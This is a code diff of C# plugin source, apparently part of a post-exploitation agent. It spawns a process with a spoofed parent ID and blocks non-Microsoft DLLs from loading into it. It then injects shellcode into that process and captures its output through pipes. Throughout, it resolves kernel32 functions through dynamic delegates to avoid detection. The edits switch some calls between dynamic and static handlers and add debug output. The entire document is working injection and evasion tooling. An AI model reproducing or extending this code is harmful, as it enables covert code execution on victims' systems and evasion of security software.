@@ -14,7 +14,9 @@ namespace Plugins
     {
         DynamicHandler.DynamicMakePipe dlgCretPipe = (DynamicHandler.DynamicMakePipe)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CrtPipe, typeof(DynamicHandler.DynamicMakePipe));
         DynamicHandler.DynamicSetHndlInfo dlgSetHandle = (DynamicHandler.DynamicSetHndlInfo)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.SetHanldeInfo, typeof(DynamicHandler.DynamicSetHndlInfo));
-        DynamicHandler.DynamicInitProcThreaAttrList dlgInitProcThreadAttrLst = (DynamicHandler.DynamicInitProcThreaAttrList)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.IntlzProcThrdAttrList, typeof(DynamicHandler.DynamicInitProcThreaAttrList));
+        //DynamicHandler.DynamicInitProcThreaAttrList dlgInitProcThreadAttrLst = (DynamicHandler.DynamicInitProcThreaAttrList)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.IntlzProcThrdAttrList, typeof(DynamicHandler.DynamicInitProcThreaAttrList));
+        //DynamicHandler.DynamicInitProcThreaAttrList2 dlgInitProcThreadAttrLst2 = (DynamicHandler.DynamicInitProcThreaAttrList2)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.IntlzProcThrdAttrList, typeof(DynamicHandler.DynamicInitProcThreaAttrList2));
+
         DynamicHandler.DynamicCreateProc dlgCretProc = (DynamicHandler.DynamicCreateProc)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CreateProc, typeof(DynamicHandler.DynamicCreateProc));
         DynamicHandler.DynamicWaitForSingleObject dlgWaitForObj = (DynamicHandler.DynamicWaitForSingleObject)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.WitFrObj, typeof(DynamicHandler.DynamicWaitForSingleObject));
         DynamicHandler.DynamicOpenProc dlgOpenProc = (DynamicHandler.DynamicOpenProc)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.OpenProc, typeof(DynamicHandler.DynamicOpenProc));
@@ -81,7 +83,8 @@ namespace Plugins
             IntPtr hDupStdOutWrite = IntPtr.Zero;
 
             // Create the pipe and make sure read is not inheritable
-            DynamicHandler.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
+            dlgCretPipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
+            //DynamicHandler.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
             dlgSetHandle(hStdOutRead, DynamicHandler.HANDLE_FLAGS.INHERIT, 0);
 
             var pInfo = new DynamicHandler.PROCESS_INFORMATION();
@@ -96,7 +99,9 @@ namespace Plugins
             siEx.StartupInfo.hStdOutput = hStdOutWrite;
 
             var lpSize = IntPtr.Zero;
-            var success = DynamicHandler.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+            var success = StaticHandler.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+            //var test = IntPtr.Zero;
+            //var success = dlgInitProcThreadAttrLst(IntPtr.Zero, 2, 0, ref lpSize);
 
             if (success || lpSize == IntPtr.Zero) //Successfully initialized ProcThreadAttributeList
             {
@@ -104,8 +109,8 @@ namespace Plugins
             }
 
             siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-            success = DynamicHandler.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
-
+            success = StaticHandler.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
+            //success = dlgInitProcThreadAttrLst(out siEx.lpAttributeList, 2, 0, ref lpSize);
             if (!success)
             {
                 TaskResponseHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
@@ -137,7 +142,7 @@ namespace Plugins
                 TaskResponseHandler.WriteLine($"Failed to start: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                 return false;
             }
-
+            Console.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);
             TaskResponseHandler.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);
 
             method.Inject(sc, pInfo.hProcess);
@@ -171,7 +176,8 @@ namespace Plugins
             IntPtr lpValueProc = IntPtr.Zero;
 
             var lpSize = IntPtr.Zero;
-            var success = DynamicHandler.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+            var success = StaticHandler.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+
             
             if (success || lpSize == IntPtr.Zero) //Successfully initialized ProcThreadAttributeList
             {
@@ -179,8 +185,8 @@ namespace Plugins
             }
 
             siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-            success = DynamicHandler.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
-
+            success = StaticHandler.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
+            Console.WriteLine($"InitializeProcThreadAttributeList: {success}");
             if (!success)
             {
                 TaskResponseHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
@@ -218,9 +224,9 @@ namespace Plugins
             TaskResponseHandler.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);
 
             method.Inject(sc, pInfo.hProcess);
-            
+            Console.WriteLine("Waiting.");
             dlgWaitForObj(pInfo.hProcess, DynamicHandler.INFINITE);
-            
+            Console.WriteLine("Done Waiting.");
             CleanUp(lpValueProc, tempHandle, pInfo, siEx);
 
             return pInfo.hProcess != IntPtr.Zero;
@@ -233,7 +239,7 @@ namespace Plugins
             Marshal.WriteInt64(lpMitigationPolicy, DynamicHandler.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
 
             // Add Microsoft-only DLL protection to our StartupInfoEx struct
-            var success = dlgUpdProcThreadAttr(
+            var success = Native.UpdateProcThreadAttribute(
                 siEx.lpAttributeList,
                 0,
                 (IntPtr)DynamicHandler.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
@@ -259,7 +265,7 @@ namespace Plugins
             Marshal.WriteIntPtr(lpValueProc, parentHandle);
 
             //Updates the parent process ID
-            bool success = DynamicHandler.UpdateProcThreadAttribute(
+            bool success = StaticHandler.UpdateProcThreadAttribute(
                 siEx.lpAttributeList,
                 0,
                 (IntPtr)DynamicHandler.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
@@ -309,7 +315,6 @@ namespace Plugins
 
                 if(dlgPeekPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) //Check if we have bytes to read
                 {
-                    Console.WriteLine(bytesToRead);
                     if(bytesToRead == 0) //We don't have any bytes to read
                     {
                         if (ct.IsCancellationRequested) //Check if we're supposed to exit
@@ -365,7 +370,8 @@ namespace Plugins
         {
             if (siEx.lpAttributeList != IntPtr.Zero) //Close our allocated attributes list
             {
-                dlgDelProcThrdAttrLst(siEx.lpAttributeList);
+
+                StaticHandler.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                 Marshal.FreeHGlobal(siEx.lpAttributeList);
             }
 
